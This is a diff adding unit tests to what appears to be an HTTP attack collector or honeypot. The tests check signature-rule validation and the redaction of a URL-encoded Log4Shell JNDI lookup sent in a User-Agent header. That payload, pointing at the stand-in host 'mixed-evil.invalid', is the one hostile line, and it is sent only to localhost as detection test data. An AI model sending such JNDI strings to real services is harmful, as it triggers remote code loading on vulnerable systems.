@@ -495,7 +495,7 @@ class HttpCollectorSecurityTests(unittest.TestCase):
         self.assertIsNone(multi_dict["candidate_cve"])
         self.assertEqual(derive_signature_attack_category(multi_matches), "suspected_cve_probe")
 
-        # 3. Invalid candidate_cve rule without candidate_cves is rejected
+        # 3. Invalid rule definitions are rejected
         with self.assertRaises(ValueError):
             SignatureRule(
                 signature_id="invalid-rule",
@@ -505,6 +505,44 @@ class HttpCollectorSecurityTests(unittest.TestCase):
                 candidate_cves=(),
                 match_text=lambda _: None,
             )
+        with self.assertRaises(ValueError):
+            SignatureRule(
+                signature_id="invalid-indicator-with-cve",
+                rule_version="1.0.0",
+                attack_technique="sql_injection",
+                classification="indicator_match",
+                candidate_cves=("CVE-2021-44228",),
+                match_text=lambda _: None,
+            )
+        with self.assertRaises(ValueError):
+            SignatureRule(
+                signature_id="invalid-cve-format",
+                rule_version="1.0.0",
+                attack_technique="rce",
+                classification="candidate_cve",
+                candidate_cves=("NOT-A-CVE",),
+                match_text=lambda _: None,
+            )
+
+    def test_redacts_encoded_jndi_even_when_mixed_with_literal_braces(self) -> None:
+        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+        conn.request(
+            "GET",
+            "/probe",
+            headers={
+                "User-Agent": "${safe} %24%7Bjndi%3Aldap%3A%2F%2Fmixed-evil.invalid%2Fa%7D",
+            },
+        )
+        resp = conn.getresponse()
+        resp.read()
+        self.assertEqual(resp.status, 404)
+        conn.close()
+
+        raw_jsonl = self.output_path.read_text(encoding="utf-8")
+        self.assertNotIn("mixed-evil.invalid", raw_jsonl)
+        rec = self._read_records()[0]
+        self.assertEqual(rec["metadata"]["headers"]["user-agent"], "[REDACTED_JNDI]")
+        self.assertEqual(rec["attack_category"], "suspected_cve_probe")
 
 
 if __name__ == "__main__":
